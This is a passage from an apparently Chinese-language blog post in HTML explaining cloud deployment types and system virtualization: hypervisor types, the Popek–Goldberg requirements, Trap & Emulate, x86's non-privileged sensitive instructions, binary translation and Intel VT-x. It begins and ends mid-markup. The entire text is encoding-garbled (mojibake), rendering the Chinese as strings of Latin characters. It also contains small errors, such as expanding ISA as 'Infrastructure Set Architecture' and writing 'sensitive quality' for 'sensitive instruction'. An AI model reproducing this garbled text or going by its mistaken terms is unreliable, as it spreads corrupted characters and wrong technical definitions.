alt="image.png"></p><p>æˆ‘ä»¬æŒ‰ç…§å…¶éƒ¨ç½²å½¢å¼çš„ä¸åŒè¿˜å¯ä»¥å°†äº‘åˆ†ä¸ºä»¥ä¸‹ä¸‰ç±»ï¼š</p><ul><li><strong>å…¬æœ‰äº‘</strong>ï¼šäº‘æœåŠ¡çš„åŸºç¡€è®¾æ–½éƒ¨ç½²åœ¨äº‘å‚å•†çš„æœºæˆ¿é‡Œï¼Œç”±äº‘å‚å•†å‘ç”¨æˆ·æä¾›äº‘ä¸Šèµ„æºï¼Œ<strong>äº‘èµ„æºå®ä½“ç”±å¤šä¸ªç”¨æˆ·å…±äº«</strong>ï¼ˆä¸€å°ç‰©ç†æœåŠ¡å™¨ä¸Šå¯èƒ½è·‘å¤šä¸ªç”¨æˆ·çš„è™šæ‹Ÿæœºï¼‰</li><li><strong>ç§æœ‰äº‘</strong>ï¼šäº‘æœåŠ¡çš„åŸºç¡€è®¾æ–½éƒ¨ç½²åœ¨ç”¨æˆ·è‡ªå·±çš„æœºæˆ¿é‡Œï¼ˆéƒ¨ç½²åœ¨å†…éƒ¨è‡ªæœ‰æœºæˆ¿çš„å«å†…éƒ¨ç§æœ‰äº‘ï¼Œéƒ¨ç½²åœ¨å¤–éƒ¨æ‰˜ç®¡æœºæˆ¿çš„å«å¤–éƒ¨ç§æœ‰äº‘ï¼‰ï¼Œç”±äº‘å‚å•†æä¾›éƒ¨ç½²æœåŠ¡æˆ–æ˜¯ç”¨æˆ·è‡ªè¡Œéƒ¨ç½²ï¼Œ<strong>äº‘èµ„æºå®ä½“ç”±ç”¨æˆ·ç‹¬äº«</strong></li><li><strong>æ··åˆäº‘</strong>ï¼šç”¨æˆ·åœ¨ä½¿ç”¨äº‘å‚å•†æä¾›çš„äº‘èµ„æºçš„åŒæ—¶è‡ªå·±ä¹Ÿæ­å»ºäº†ä¸€ä¸ªäº‘</li></ul><p><img src="https://s2.loli.net/2022/08/07/SrJDGa6shAWq4ul.png" alt="image.png"></p><blockquote><p>ç°åœ¨ç½‘ä¸Šå„ç§å…³äºäº‘è®¡ç®—çš„æ–‡ç« åŒ…æ‹¬åƒç™¾åº¦ç™¾ç§‘è¿™æ ·çš„ï¼Œ<strong>å‡ ä¹æ²¡æœ‰ä¸€ä¸ªèƒ½å‡†ç¡®ç»™è¿™ä¸ªæ¦‚å¿µä¸‹ä¸€ä¸ªæœ€åŸºæœ¬çš„å®šä¹‰çš„</strong>ï¼Œå…¨ç¯‡éƒ½æ˜¯å„ç§å‡å¤§ç©ºçš„å¥—è¯ï¼Œçœ‹ç€è®©äººè¡€å‹å‡é«˜â€¦</p><blockquote><p><s>ğŸ‘´è§‰å¾—ç™¾åº¦ç™¾ç§‘å°±æ˜¯ä¸ªğŸ“â‘§</s></p></blockquote><p>äº‘è®¡ç®—æœ¬è´¨ä¸Šå…¶å®å°±æ˜¯ä¸€ä¸ªé€šè¿‡äº’è”ç½‘å‘ç”¨æˆ·æŒ‰éœ€æä¾›å¯åŠ¨æ€ä¼¸ç¼©çš„ IT èµ„æºï¼Œ<strong>è‡³äºç”¨æˆ·æ‹¿åˆ°è¿™ä¸ªè®¡ç®—èµ„æºåè¦åšä»€ä¹ˆç¬”è€…å¹¶ä¸å…³å¿ƒ</strong>ï¼ˆç¬‘ï¼‰</p></blockquote><h1>0x02. ç³»ç»Ÿè™šæ‹ŸåŒ–æ¦‚è¿°</h1><h2 id="ä¸€ã€åŸºæœ¬æ¨¡å‹">ä¸€ã€åŸºæœ¬æ¨¡å‹</h2><p>å¯¹äºä¸€å°è®¡ç®—æœºï¼Œæˆ‘ä»¬å¯ä»¥ç®€å•åœ°æŠ½è±¡æˆä¸‹å›¾æ‰€ç¤ºçš„ä¸‰å±‚æ¨¡å‹ï¼Œä»ä¸‹å¾€ä¸Šåˆ†åˆ«æ˜¯<strong>ç‰©ç†ç¡¬ä»¶å±‚ã€æ“ä½œç³»ç»Ÿå±‚ã€åº”ç”¨ç¨‹åºå±‚</strong>ï¼š</p><p><img src="https://s2.loli.net/2022/08/02/5jwhR2HnDTCp3q8.png" alt="image.png"></p><p>æˆ‘ä»¬é¦–å…ˆç»™ã€Œè™šæ‹Ÿæœºã€ä¸‹ä¸€ä¸ªå®šä¹‰ï¼š</p><ul><li><strong>è™šæ‹Ÿæœº</strong>ï¼ˆVirtual Machineï¼‰æ˜¯è®¡ç®—æœºçš„è™šæ‹ŸåŒ–å®ä¾‹ï¼Œæ‹¥æœ‰è‡ªå·±çš„è™šæ‹Ÿç¡¬ä»¶ï¼ˆå¦‚ CPUã€å†…å­˜ã€è®¾å¤‡ç­‰ï¼‰ï¼Œå¯æ‰§è¡Œä¸è®¡ç®—æœºå‡ ä¹å®Œå…¨ç›¸åŒçš„åŠŸèƒ½ï¼ŒåŒ…æ‹¬è¿è¡Œåº”ç”¨å’Œæ“ä½œç³»ç»Ÿ</li></ul><p>å³æˆ‘ä»¬å¯ä»¥æŠŠä¸€ä¸ªè™šæ‹Ÿæœºå®ä¾‹çœ‹ä½œæ˜¯ä¸€å°å…·æœ‰å¦‚ä¸Šå›¾æ‰€ç¤ºå±‚æ¬¡çš„<strong>é€»è¾‘çš„è®¡ç®—æœº</strong></p><p>ä½†è™šæ‹Ÿæœºçš„è¿è¡Œæ˜¯éœ€è¦æœ‰ç‰©ç†ç¯å¢ƒæ‰€æ”¯æ’‘çš„ï¼ŒåŒæ—¶è™šæ‹Ÿæœºå®ä¾‹ä¹Ÿæ˜¯ä¸å¯èƒ½å‡­ç©ºå‡ºç°/å‡­ç©ºæ¶ˆå¤±çš„ï¼Œå› æ­¤æ¥ä¸‹æ¥æˆ‘ä»¬å¼•å…¥ä¸€ä¸ªæ–°çš„æ¦‚å¿µâ€”â€”<strong>VMM</strong>ï¼Œå³ <code>Virtual Machine Monitor</code>ï¼Œåˆç§° <code>Hypervisor</code>ï¼Œè¿™æ˜¯ä¸€ä¸ªä»‹äº VM ä¸ç¡¬ä»¶ä¸­é—´çš„è½¯ä»¶å±‚ï¼Œ<strong>å…¶è´Ÿè´£ VM çš„åˆ›å»ºã€é”€æ¯ç­‰å·¥ä½œï¼Œå¹¶ä¸º VM æä¾›äº†è¿è¡Œç¯å¢ƒ</strong>ï¼šã€Œè™šæ‹Ÿç¡¬ä»¶æŠ½è±¡å±‚ã€</p><p><img src="https://s2.loli.net/2022/08/05/C4czg3kVIKAJb5L.png" alt="image.png"></p><p>1974å¹´ï¼ŒGerald J. Popek ä¸ Robert P. Goldberg å‘è¡¨äº†åˆä½œè®ºæ–‡<a href="https://dl.acm.org/doi/pdf/10.1145/361011.361073">ã€ŠFormal Requirements for Virtualizable Third Generation Architecturesã€‹</a>ï¼Œåœ¨è®ºæ–‡ä¸­æå‡ºäº†æ»¡è¶³è™šæ‹ŸåŒ–ç³»ç»Ÿç»“æ„çš„ VMM çš„ä¸‰ä¸ªå……åˆ†æ¡ä»¶ï¼Œç§°ä¹‹ä¸º<code>Popek and Goldberg virtualization requirements</code>ï¼š</p><ul><li><strong>ç­‰ä»·æ€§</strong>ï¼ˆessentially identicalï¼‰ï¼šä¸€ä¸ªè¿è¡Œäº VMM ä¸‹çš„ç¨‹åºï¼Œ<strong>å…¶è¡Œä¸ºåº”ä¸ç›´æ¥è¿è¡Œäºç­‰ä»·ç‰©ç†æœºä¸Šçš„åŒç¨‹åºçš„è¡Œä¸ºå®Œå…¨ä¸€è‡´</strong></li><li><strong>èµ„æºæ§åˆ¶</strong>ï¼ˆresource controlï¼‰ï¼šVMM å¯¹è™šæ‹Ÿèµ„æºå…·æœ‰<strong>å®Œå…¨çš„æ§åˆ¶èƒ½åŠ›</strong>ï¼ŒåŒ…æ‹¬èµ„æºçš„åˆ†é…ã€ç›‘æ§ã€å›æ”¶</li><li><strong>æ•ˆç‡æ€§</strong>ï¼ˆefficiencyï¼‰ï¼šæœºå™¨æŒ‡ä»¤ä¸­ç»å¸¸ä½¿ç”¨çš„é‚£ä¸€éƒ¨åˆ†åº”åœ¨æ²¡æœ‰ VMM å¹²é¢„ä¸‹<strong>ç›´æ¥åœ¨ç¡¬ä»¶ä¸Šæ‰§è¡Œ</strong></li></ul><p>ç”±æ­¤ï¼Œè®ºæ–‡ä¸­æå‡ºäº†ä¸¤ç§ Hypervisor æ–¹æ¡ˆï¼Œè¿™ä¹Ÿæˆä¸ºäº†ç°åœ¨æœ€ä¸»æµçš„ä¸¤ç§æ–¹æ¡ˆï¼š</p><ul><li><p><code>Type I</code> ï¼š<strong>Hypervisor ç›´æ¥è¿è¡Œåœ¨ç¡¬ä»¶ä¸Šï¼Œå³ä»¥ Hypervisor ä½œä¸º Host OS ç›´æ¥ç®¡æ§ç¡¬ä»¶èµ„æº</strong>ã€‚ä¾‹å¦‚ <code>VMware ESXI</code> ä¾¿æ˜¯é‡‡ç”¨æ­¤ç§æ¶æ„çš„ Hypervisor</p><p><img src="https://s2.loli.net/2022/08/03/Mn2cKxtpXdibHRG.png" alt="image.png"></p></li><li><p><code>Type II</code>ï¼š<strong>Hypervisor è¿è¡Œåœ¨ä¼ ç»Ÿçš„æ“ä½œç³»ç»Ÿä¸Šï¼Œä¸å…¶ä»–åº”ç”¨ç¨‹åºå¹¶è¡Œè¿è¡Œ</strong>ã€‚ä¾‹å¦‚ <code>Qemu</code> ä¸ <code>VMware Player</code> ä¾¿æ˜¯é‡‡ç”¨æ­¤ç§æ¶æ„çš„ Hypervisor</p><p><img src="https://s2.loli.net/2022/08/03/FNComsjbSdTheL6.png" alt="image.png"></p></li></ul><p>å…·ä½“åˆ°æŠ€æœ¯ç»†èŠ‚ä¸Šï¼Œæˆ‘ä»¬åº”è¯¥å¦‚ä½•å»å®ç°ä¸Šè¿°çš„è™šæ‹ŸåŒ–æ–¹æ¡ˆå‘¢ï¼Ÿæˆ‘ä»¬å…ˆæ¥ä»‹ç»ä¸€ä¸ªæ¦‚å¿µâ€”â€”ã€Œæ•æ„ŸæŒ‡ä»¤ã€ï¼Œå³<strong>æ“ä½œç‰¹æƒèµ„æºçš„æŒ‡ä»¤</strong>ï¼Œä¾‹å¦‚ IO æ“ä½œã€ä¿®æ”¹é¡µè¡¨å¯„å­˜å™¨ç­‰</p><p>ä¸ºäº†æˆ‘ä»¬çš„ VMM èƒ½å¤Ÿå®Œå…¨åœ°æ§åˆ¶ç³»ç»Ÿèµ„æºï¼Œ<strong>æ•æ„Ÿè´¨é‡å¿…é¡»åœ¨ VMM çš„ç›‘æ§å®¡æŸ¥ä¸‹å®Œæˆï¼Œæˆ–æ˜¯ç»ç”± VMM æ¥å®Œæˆ</strong>ã€‚å› æ­¤ï¼Œè‹¥ä¸€ä¸ªæ¶æ„ä¸­æ‰€æœ‰çš„ç‰¹æƒæŒ‡ä»¤éƒ½æ˜¯æ•æ„Ÿè´¨é‡ï¼Œåˆ™æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<strong>ç‰¹æƒçº§å‹ç¼©</strong>ï¼ˆRing Compressionï¼‰çš„æ–¹å¼æ¥å®ç°è™šæ‹Ÿç¯å¢ƒï¼š</p><ul><li>VMM è¿è¡Œåœ¨æœ€é«˜ç‰¹æƒçº§ä¸Šï¼ŒGuest VM è¿è¡Œåœ¨ä½ç‰¹æƒçº§ä¸Šï¼Œå½“ Guest VM æ‰§è¡Œåˆ°æ•æ„ŸæŒ‡ä»¤æ—¶ï¼Œå…¶ä¾¿ä¼šé™·å…¥ä½äºæœ€é«˜ç‰¹æƒçº§çš„ VMMï¼Œæ­¤æ—¶ä¾¿èƒ½ç”± VMM æ¨¡æ‹Ÿæ•æ„ŸæŒ‡ä»¤çš„è¡Œä¸º</li></ul><p>â€”â€”è¿™å°±æ˜¯ç³»ç»Ÿè™šæ‹ŸåŒ–æœ€å…¸ä¸­å…¸çš„æ¨¡å‹**ã€ŒTrap &amp; Emulateã€**ï¼š</p><ul><li>æˆ‘ä»¬å°†æ“ä½œç³»ç»Ÿåˆ†ä¸ºä¸¤ä¸ªè¿è¡Œæ¨¡å¼ï¼šã€Œç”¨æˆ·æ¨¡å¼ï¼ˆuser modeï¼‰ã€ä¸ã€Œç‰¹æƒæ¨¡å¼ï¼ˆprivileged modeï¼‰ã€ï¼Œåœ¨ç”¨æˆ·æ¨¡å¼ä¸‹åªèƒ½ç›´æ¥æ‰§è¡Œéç‰¹æƒæŒ‡ä»¤ï¼Œå½“æ‰§è¡Œåˆ°ç‰¹æƒæŒ‡ä»¤æ—¶ä¾¿ä¼šè§¦å‘å¼‚å¸¸ï¼Œä»è€Œé™·å…¥ç‰¹æƒæ¨¡å¼å¯¹åº”çš„å¤„ç†ä»£ç ä¸­</li><li>Guest VM è¿è¡Œåœ¨ç”¨æˆ·æ¨¡å¼ä¸‹ï¼Œä»è€Œä½¿å¾—æ™®é€šæŒ‡ä»¤å¯ä»¥ç›´æ¥æ”¾åœ¨ CPU ä¸Šæ‰§è¡Œï¼Œå½“ Guest VM æ‰§è¡Œåˆ°<strong>æ•æ„ŸæŒ‡ä»¤</strong>æ—¶ï¼Œä¾¿ä¼š<strong>è§¦å‘å¼‚å¸¸ï¼Œæ­¤æ—¶ç”± VMM ä»‹å…¥å¹¶æ¨¡æ‹Ÿå…¶åº”æœ‰çš„è¡Œä¸º</strong></li></ul><p>å› æ­¤ï¼Œä¸€ä¸ª ISA æ˜¯å¦å¯ä»¥è™šæ‹ŸåŒ–ï¼Œå…¶æ ¸å¿ƒå°±åœ¨äº<strong>æ•æ„ŸæŒ‡ä»¤æ˜¯å¦éƒ½æ˜¯ç‰¹æƒæŒ‡ä»¤</strong></p><p><img src="https://s2.loli.net/2022/08/04/cipfjY89LsgIlVb.png" alt="çŸ¥ä¹å·çš„å›¾"></p><p>è€Œç”±äºç¡¬ä»¶å®ä½“èµ„æºä¹Ÿæœ‰ç€ä¸åŒçš„ç±»å‹ï¼Œæˆ‘ä»¬å°†å¯¹ä¸åŒç±»å‹å®ä½“èµ„æºçš„è™šæ‹ŸåŒ–æŠ€æœ¯åˆ†ä¸ºå¦‚ä¸‹ç±»å‹ï¼š</p><ul><li>CPU è™šæ‹ŸåŒ–</li><li>å†…å­˜è™šæ‹ŸåŒ–</li><li>I/O è™šæ‹ŸåŒ–</li></ul><h2 id="äºŒã€é‡åˆ°çš„é—®é¢˜">äºŒã€é‡åˆ°çš„é—®é¢˜</h2><p>åœ¨è™šæ‹ŸåŒ–æŠ€æœ¯çš„å‘å±•åˆæœŸï¼Œåœ¨ä¸ªäººè®¡ç®—æœºé¢†åŸŸå¹¿æ³›ä½¿ç”¨çš„ x86 æ¶æ„å¹¶æ²¡æœ‰å¯¹è™šæ‹ŸåŒ–çš„ç»å…¸æ¶æ„ã€ŒTrap &amp; Emulateã€æä¾›å¾ˆå¥½çš„æ”¯æŒï¼Œå­˜åœ¨ç€å¯¹ç³»ç»Ÿè™šæ‹ŸåŒ–çš„æ”¯æŒç¼ºé™·ï¼Œ<strong>ç³»ç»Ÿè™šæ‹ŸåŒ–å¹¶ä¸èƒ½ç›´æ¥è€Œæœ‰æ•ˆçš„å®ç°</strong></p><p>Intel åˆ†çº§ä¿æŠ¤ç¯å°†æƒé™åˆ†ä¸º ring0~ ring3ï¼Œå…¶ä¸­æ“ä½œç³»ç»Ÿå†…æ ¸è¿è¡Œåœ¨ ring0 æƒé™è€Œç”¨æˆ·è¿›ç¨‹è¿è¡Œåœ¨ ring3 æƒé™</p><p><img src="https://i.loli.net/2021/02/22/yQXZhLEHVn1b3uC.png" alt=""></p><p>åœ¨ç³»ç»Ÿè™šæ‹ŸåŒ–çš„ç»å…¸æ¶æ„ã€ŒTrap &amp; Emulateã€ä¸­ï¼Œ Guest OS å…¨éƒ¨è¿è¡Œåœ¨ ring3ï¼Œå½“æ¶‰åŠåˆ°ä¸€äº›æ•æ„ŸæŒ‡ä»¤æ—¶ï¼ŒVM è§¦å‘ General Protection å¼‚å¸¸ï¼Œç”± VMM è¿›è¡Œæˆªè·å¹¶å¤„ç†ï¼Œ<strong>ä½†ä¸æ˜¯æ‰€æœ‰æ•æ„ŸæŒ‡ä»¤éƒ½æ˜¯ç‰¹æƒæŒ‡ä»¤ï¼Œä¸æ˜¯æ‰€æœ‰çš„æ•æ„ŸæŒ‡ä»¤éƒ½æœ‰è§¦å‘å¼‚å¸¸ä»¥è®© VMM ä»‹å…¥çš„æœºä¼š</strong>ï¼Œ x86 æ¶æ„ä¸­<strong>ä¸€å…±æœ‰ 17 æ¡éç‰¹æƒæ•æ„ŸæŒ‡ä»¤</strong>ï¼š</p><p><img src="https://s2.loli.net/2022/08/04/qirIbepFOA4U5xf.png" alt="image.png"></p><p>è¿™äº›æŒ‡ä»¤<strong>ç›´æ¥è¿åäº† <code>Popek and Goldberg virtualization requirements</code> ï¼Œä»è€Œä½¿å¾— x86 ä¸æ˜¯ä¸€ä¸ªå¯ä»¥è™šæ‹ŸåŒ–çš„æ¶æ„</strong></p><blockquote><p>ä¾‹å¦‚åœ¨ x86 ä¸‹æˆ‘ä»¬æƒ³è¦ç”¨ popf ä¿®æ”¹ eflags çš„ä¸­æ–­å¼€å…³ä½ï¼ˆIFï¼‰æ—¶ï¼Œè‹¥æˆ‘ä»¬åœ¨ç”¨æˆ·æ€ä¸‹è¿›è¡Œè¿™æ ·çš„æ“ä½œï¼Œ<strong>åˆ™ä¼šç›´æ¥è¢«ç¡¬ä»¶æ‰€å¿½è§†ï¼Œè€Œä¸ä¼šå¼•èµ·å¼‚å¸¸</strong>ï¼Œè¿™ä»¤ VMM æ— æ³•ä»‹å…¥</p></blockquote><p>â€œç¡¬ä»¶ä¸å¤Ÿï¼Œè½¯ä»¶æ¥å‡‘â€ã€‚å› æ­¤åœ¨ç¡¬ä»¶è¿˜æœªæä¾›å¯¹è™šæ‹ŸåŒ–çš„è¶³å¤Ÿæ”¯æŒä¹‹å‰ï¼ŒHypervisor åªèƒ½ä»è½¯ä»¶å±‚é¢ä¸‹åŠŸå¤«ï¼Œäºæ˜¯å‡ºç°äº†ä¸¤ç§çº¯è½¯ä»¶è™šæ‹ŸåŒ–æŠ€æœ¯ï¼šã€Œæ¨¡æ‹Ÿæ‰§è¡Œã€ï¼ˆVMWareï¼‰ä¸ã€Œç›´æ¥æºä»£ç æ”¹å†™ã€ï¼ˆXenï¼‰</p><p>åœ¨è½¯ä»¶è™šæ‹ŸåŒ–æŠ€æœ¯å·²ç»å‘å±•æˆç†Ÿå¤šå¹´ä¹‹åï¼Œx86 æ¶æ„å¯¹è™šæ‹ŸåŒ–çš„æ”¯æŒæ‰å§—å§—æ¥è¿Ÿï¼šã€Œç¡¬ä»¶è¾…åŠ©è™šæ‹ŸåŒ–ã€ï¼ˆIntel VTï¼‰å¼€å§‹å‡ºç°åœ¨äººä»¬çš„è§†é‡å½“ä¸­</p><h2 id="ä¸‰ã€å®ç°æ–¹æ¡ˆ">ä¸‰ã€å®ç°æ–¹æ¡ˆ</h2><h3 id="I-å®Œå…¨è™šæ‹ŸåŒ–ï¼ˆFull-virtualizationï¼‰">I.å®Œå…¨è™šæ‹ŸåŒ–ï¼ˆFull-virtualizationï¼‰</h3><p>å®Œå…¨è™šæ‹ŸåŒ–æŠ€æœ¯æä¾›ä¸€ä¸ª<strong>å®Œæ•´çš„è™šæ‹ŸåŒ–ç¡¬ä»¶ç¯å¢ƒ</strong>ï¼Œå…è®¸<strong>æœªç»ä¿®æ”¹çš„ Guest OS ç›´æ¥åœ¨ VM ä¸Šè¿è¡Œ</strong>ï¼Œåœ¨ Guest OS çš„è§†è§’ï¼Œå…¶ä¸è¿è¡Œåœ¨çœŸå®çš„ç‰©ç†å¹³å°ä¸Šä¸€èˆ¬æ— äºŒ</p><p>å®Œå…¨è™šæ‹ŸåŒ–æ„å‘³ç€ Guest OS ä¼šå°†æ“ä½œæ­£å¸¸çš„å¤„ç†å™¨ã€å†…å­˜ã€I/O è®¾å¤‡é‚£æ ·åœ¨è™šæ‹ŸåŒ–ç¡¬ä»¶ç¯å¢ƒä¸­æ“ä½œï¼Œå› æ­¤è¿™éœ€è¦ VMM èƒ½å¤Ÿæ­£ç¡®å¤„ç† Guest OS æ‰€æœ‰å¯èƒ½çš„è¡Œä¸ºï¼Œå› æ­¤è¿™éœ€è¦å¯¹åº”çš„æ¶æ„æ»¡è¶³ <code>Popek and Goldberg virtualization requirements</code></p><p>ç”±äº x86 æ¶æ„çš„ç¡¬ä»¶åœ¨æœ€åˆå¹¶æ²¡æœ‰å¯¹è™šæ‹ŸåŒ–æä¾›å¾ˆå¥½çš„æ”¯æŒï¼Œå› æ­¤å®Œå…¨è™šæ‹ŸåŒ–ç»å†äº†ä¸¤ä¸ªé˜¶æ®µï¼š</p><h4 id="1ï¼‰ã€Œè½¯ä»¶è¾…åŠ©çš„å®Œå…¨è™šæ‹ŸåŒ–ã€">1ï¼‰ã€Œè½¯ä»¶è¾…åŠ©çš„å®Œå…¨è™šæ‹ŸåŒ–ã€</h4><p>çº¯è½¯ä»¶å®ç°çš„å®Œå…¨è™šæ‹ŸåŒ–ä¸»è¦ä¾èµ–ä¸¤ä¸ªæŠ€æœ¯ï¼š</p><ul><li><strong>ã€Œä¼˜å…ˆçº§å‹ç¼©ã€</strong>ï¼ˆRing Compressionï¼‰ï¼š<strong>å³ VMM ä¸ GUest VM è¿è¡Œåœ¨ä¸åŒçš„ç‰¹æƒçº§ä¸Š</strong>ã€‚ä¾‹å¦‚ <code>VMM è¿è¡Œåœ¨ ring0ã€Guest OS kernel è¿è¡Œåœ¨ ring1ã€Guest APP è¿è¡Œåœ¨ ring3 </code>ï¼Œå½“ Guest OS æƒ³è¦å°è¯•æ‰§è¡Œç‰¹æƒæŒ‡ä»¤æ—¶ï¼Œä¾¿ä¼šè§¦å‘å¼‚å¸¸ï¼Œæ­¤æ—¶ VMM ä¾¿èƒ½æˆªè·è¯¥ç‰¹æƒæŒ‡ä»¤å¹¶è¿›è¡Œæ¨¡æ‹Ÿæ‰§è¡Œã€‚ä½†æ­£å¦‚æˆ‘ä»¬å‰é¢æ‰€è¯´ï¼Œ<strong>ä¸æ˜¯æ‰€æœ‰æ•æ„ŸæŒ‡ä»¤éƒ½æ˜¯ç‰¹æƒæŒ‡ä»¤</strong>ï¼Œè¿™ä½¿å¾—éƒ¨åˆ†æ•æ„ŸæŒ‡ä»¤æ— æ³•è¢« VMM æˆªè·å¹¶å¤„ç†ï¼Œä»è€Œå¯¼è‡´äº†è™šæ‹ŸåŒ–å¹³å°ä¸ç‰©ç†å¹³å°è¡¨ç°çš„è¡Œä¸ºä¸ä¸€è‡´</li><li><strong>ã€ŒäºŒè¿›åˆ¶ä»£ç ç¿»è¯‘ã€</strong>ï¼ˆBinary Translationï¼‰ï¼šäºŒè¿›åˆ¶ä»£ç ç¿»è¯‘è¢«å¼•å…¥æ¥<strong>å¤„ç†å¯¹è™šæ‹ŸåŒ–ä¸å‹å¥½çš„æŒ‡ä»¤</strong>ï¼Œå…¶æ€æƒ³ä¾¿æ˜¯æ‰«æå¹¶ä¿®æ”¹ Guest VM çš„äºŒè¿›åˆ¶ä»£ç ï¼Œå°†éš¾ä»¥è™šæ‹ŸåŒ–çš„æŒ‡ä»¤è½¬åŒ–ä¸ºæ”¯æŒè™šæ‹ŸåŒ–çš„æŒ‡ä»¤ï¼ˆä¾‹å¦‚æ˜¾å¼åœ°è§¦å‘å¼‚å¸¸è®© VMM å¾—ä»¥ä»‹å…¥ï¼‰ï¼Œå¯¹äºéæ•æ„ŸæŒ‡ä»¤åˆ™ä»æ˜¯ç›´æ¥æ‰§è¡Œã€‚è¿™åœ¨ç¡®ä¿äº†æ€§èƒ½çš„æƒ…å†µä¸‹å®ç°äº†å®Œå…¨è™šæ‹ŸåŒ–</li></ul><p><img src="https://s2.loli.net/2022/08/05/AqLhpontmYHCS8T.png" alt="image.png"></p><blockquote><p>VMware ä¸ Qemu ä¾¿éƒ½æ˜¯é‡‡ç”¨äº†äºŒè¿›åˆ¶ä»£ç ç¿»è¯‘çš„æ”¯æŒå®Œå…¨è™šæ‹ŸåŒ–çš„è™šæ‹Ÿæœºè½¯ä»¶ï¼Œä¸è¿‡æœ€åˆçš„ Qemu æ›´ç±»ä¼¼äºã€è§£é‡Šæ‰§è¡Œã€‘çš„æ¨¡å¼</p></blockquote><p>è™½ç„¶åœ¨ä¼˜å…ˆçº§å‹ç¼©ä¸äºŒè¿›åˆ¶ä»£ç ç¿»è¯‘æŠ€æœ¯çš„é…åˆä¸‹ x86 æ¶æ„æˆåŠŸåœ°å®ç°äº†å®Œå…¨è™šæ‹ŸåŒ–ï¼Œä½†æ˜¯è¿™ç§â€œæ‰“è¡¥ä¸â€çš„æ–¹å¼å¾ˆéš¾åœ¨æ¶æ„ä¸Šä¿è¯å®Œæ•´æ€§ï¼Œå› æ­¤ x86 å‚å•†æœ€ç»ˆåœ¨ç¡¬ä»¶ä¸ŠåŠ å…¥äº†å¯¹è™šæ‹ŸåŒ–çš„æ”¯æŒï¼Œä»ç¡¬ä»¶æ¶æ„å±‚é¢å®ç°äº†å®Œå…¨è™šæ‹ŸåŒ–</p><h4 id="2ï¼‰ã€Œç¡¬ä»¶è¾…åŠ©çš„å®Œå…¨è™šæ‹ŸåŒ–ã€">2ï¼‰ã€Œç¡¬ä»¶è¾…åŠ©çš„å®Œå…¨è™šæ‹ŸåŒ–ã€</h4><p>åœ¨çº¯è½¯ä»¶è™šæ‹ŸåŒ–æŠ€æœ¯å‘å±•å¤šå¹´åï¼Œx86 æ¶æ„å¯¹è™šæ‹ŸåŒ–çš„æ”¯æŒç»ˆäºå§—å§—æ¥è¿Ÿï¼šIntel ä¸ AMD åˆ†åˆ«æ¨å‡ºäº†è‡ªå®¶çš„ç¡¬ä»¶è™šæ‹ŸåŒ–æŠ€æœ¯ Intel VT ä¸ AMD-vï¼Œåœ¨ç¡¬ä»¶å±‚é¢æ·»åŠ äº†å¯¹è™šæ‹ŸåŒ–çš„æ”¯æŒï¼Œä½¿å¾— x86 æ¶æ„ç»ˆäºæˆä¸ºä¸€ä¸ªç¬¦åˆ <code>Popek and Goldberg virtualization requirements</code>çš„ ISAï¼ˆInfrastructure Set Architectureï¼‰ï¼Œä»è€Œå¾—ä»¥å®ç°å®Œå…¨è™šæ‹ŸåŒ–</p><p>ç¡¬ä»¶è¾…åŠ©è™šæ‹ŸåŒ–æœ¬è´¨ä¸Šæ˜¯é€šè¿‡åœ¨ Guest OS ä¸ç¡¬ä»¶ä¸­é—´å†æ·»åŠ ä¸€ä¸ª VMM ä¸­é—´å±‚æ¥å®ç°çš„ï¼Œ<strong>ç”±ç¡¬ä»¶è´Ÿè´£æˆªè· OS å¯¹æ•æ„ŸæŒ‡ä»¤çš„æ‰§è¡Œä¸å¯¹æ•æ„Ÿèµ„æºçš„è®¿é—®ï¼Œå¹¶é€šè¿‡å¼‚å¸¸çš„æ–¹å¼æŠ¥å‘Šç»™ VMM</strong>ï¼Œä»è€Œä»ç¡¬ä»¶å±‚é¢å®ç°äº† <code>Popek and Goldberg virtualization requirements</code></p><p><img src="https://s2.loli.net/2022/08/05/1rfEzK89DG6Moml.png" alt="image.png"></p><p>ä»¥ <code>Intel VT-x</code> æŠ€æœ¯ä¸ºä¾‹ï¼Œå…¶åœ¨ç¡¬ä»¶æ¶æ„ä¸Šå°† CPU çš„è¿è¡Œæ¨¡å¼åˆ†ä¸ºä¸¤ç§ï¼š<strong>ã€ŒNon-Root Modeã€ä¸ã€ŒRoot Modeã€</strong>ï¼Œè¿™ä¸¤ä¸ªè¿è¡Œæ¨¡å¼éƒ½æœ‰ç€å„è‡ªçš„åˆ†çº§ä¿æŠ¤ç¯ï¼Œå…¶ä¸­ Host OS ä¸ VMM è¿è¡Œåœ¨ Root Mode ä¸‹è€Œ Guest OS åˆ™è¿è¡Œåœ¨ Non-Root Mode ä¸‹</p><p>Root Mode ä¸åŸæœ‰çš„è¿è¡Œæ¨¡å¼ä¸€èˆ¬æ— äºŒï¼Œåœ¨ Non-Root Modeä¸‹éæ•æ„ŸæŒ‡ä»¤å¯ä»¥ç›´æ¥åœ¨ç¡¬ä»¶ä¸Šæ‰§è¡Œï¼Œå½“ Guest OS è¿è¡Œäº†æ•æ„ŸæŒ‡ä»¤æ—¶ï¼Œç¡¬ä»¶ä¾¿ä¼šæ•è·åˆ°è¿™ä¸€è¡Œä¸ºï¼Œåˆ‡æ¢åˆ° Root Mode å¹¶å°†ä¹‹æŠ¥å‘Šç»™ VMMï¼Œç”± VMM å¤„ç†å¥½åå†æ¢å¤åˆ° Non-Root Mode ä¸­ç»§ç»­ Guest OS çš„è¿è¡Œï¼Œ<strong>è¿™ä»ç¡¬ä»¶å±‚é¢å®ç°äº†ã€ŒTrap &amp; Emulateã€æ¨¡å‹</strong></p><p><img src="https://s2.loli.net/2022/08/05/n9TRrsCkKZvGE3U.png" alt="image.png"></p><h3 id="II-åŠè™šæ‹ŸåŒ–ï¼ˆPara-virtualizationï¼‰">II.åŠè™šæ‹ŸåŒ–ï¼ˆPara-virtualizationï¼‰</h3><p>åŠè™šæ‹ŸåŒ–æŠ€æœ¯æœ€åˆçš„ç›®çš„ä¹Ÿæ˜¯ä¸ºäº†è§£å†³ x86 æ¶æ„æ— æ³•å®ç°ç»å…¸è™šæ‹ŸåŒ–æ¶æ„çš„é—®é¢˜ï¼Œå…¶<strong>é€šè¿‡ä¿®æ”¹æ“ä½œç³»ç»Ÿå†…æ ¸çš„ä»£ç ï¼Œä½¿å¾—æ“ä½œç³»ç»Ÿå†…æ ¸å®Œå…¨é¿å…è¿™äº›éš¾ä»¥è™šæ‹ŸåŒ–çš„æŒ‡ä»¤</strong>ï¼Œä»è€Œåœ¨ x86 